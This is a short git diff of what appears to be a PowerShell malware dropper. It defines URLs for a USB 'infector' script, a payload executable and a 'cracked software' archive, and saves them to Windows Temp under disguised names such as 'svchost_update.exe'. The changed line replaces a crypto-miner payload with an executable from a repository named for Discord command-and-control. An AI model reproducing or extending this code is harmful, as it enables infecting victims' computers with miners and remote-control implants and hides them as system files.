@@ -2,7 +2,7 @@ Start-Sleep -Seconds 15
 
 $monitorScriptPath = "C:\Windows\Temp\monitor.ps1"
 $infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
-$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/R_Final.exe"
+$payloadUrl = "https://github.com/HarshavardhanO07/testing_DISCORD_C2/raw/refs/heads/main/Athena.exe"
 $payloadPath = "C:\Windows\Temp\svchost_update.exe"
 $crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
 $crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
@@ -215,3 +215,4 @@ try {
     }
 } catch {
 }
+
